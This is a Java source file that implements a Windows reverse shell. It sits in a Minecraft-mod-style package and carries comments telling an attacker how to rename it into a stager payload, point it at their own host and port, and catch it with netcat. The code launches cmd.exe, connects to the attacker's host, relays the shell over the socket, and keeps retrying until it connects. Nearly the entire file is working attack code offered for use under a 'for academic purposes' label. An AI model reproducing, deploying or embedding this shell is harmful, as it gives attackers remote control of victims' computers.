package com.example.examplemod;

import tv.twitch.broadcast.IngestList;

import java.net.Socket;
import java.io.InputStream;
import java.io.OutputStream;


/*
 * Copyright 2018 cornerpirate.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * For academic purposes only.
 *
 * This reverse shell is based pretty much on this gist:
 *
 *   https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
 *
 * 1) Save a copy of this file to your attacker server.
 * 2) Replace "class TCPReverseShell" with "class Payload"
 * 3) Rename the file to "Payload.java"
 * 4) Alter the attacker to your hostname/ip
 * 5) set the port to match your "nc -lvp <port>"
 * 6) Start an HTTP server
 *
 * You can use Apache, Nginx or python as per this blog:
 *
 *   https://cornerpirate.com/2016/12/16/simple-http-or-https-servers/
 *
 * The reason for renaming the class is because it would baffle Stager to
 * have a class called Payload living inside it. That would be ambiguous.
 *
 * @author cornerpirate
 */

public class ReverseShell extends Thread {

    private String targetHost = "127.0.0.1";
    private Integer targetPort = 31337;

    public ReverseShell(String targetHost, Integer targetPort){
        this.targetHost = targetHost;
        this.targetPort = targetPort;
    }

    // Empty stub for method overloading
    public ReverseShell() {}

    /**
     * This method is called when the payload is compiled and executed. I am
     * showing a reverse shell here for Windows.
     */
    public void run() {
        if (targetHost == null){
            targetHost = "127.0.0.1";
        }
        if (targetPort == null){
            targetPort = 31337;
        }
        while(true) {
            // IP address or hostname of attacker
            // String targetHost = "192.168.1.72";

            // For a windows target do this. For linux "/bin/bash"
            String cmd = "cmd.exe";
            try {
                System.out.println("Trying reverse shell to: " + targetHost + ":" + Integer.toString(targetPort));
                // The rest creates a new process
                // Establishes a socket to the attacker
                // Then redirects the stdin, stdout and stderr to the port.
                Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
                Socket s = new Socket(targetHost, targetPort);
                InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
                OutputStream po = p.getOutputStream(), so = s.getOutputStream();
                // read all input and output forever.
                while (!s.isClosed()) {
                    while (pi.available() > 0) {
                        so.write(pi.read());
                    }
                    while (pe.available() > 0) {
                        so.write(pe.read());
                    }
                    while (si.available() > 0) {
                        po.write(si.read());
                    }
                    so.flush();
                    po.flush();
                    Thread.sleep(50);
                    try {
                        p.exitValue();
                        break;
                    } catch (Exception e) {
                    }
                }
                p.destroy();
                s.close();
                break;
            } catch (Exception ex) {
                // Ignore errors as we are doing naughty things anyway.
                System.out.println("Cant connect to " + targetHost + ":" + Integer.toString(targetPort) + ", retrying...");
            }
        }
    }
}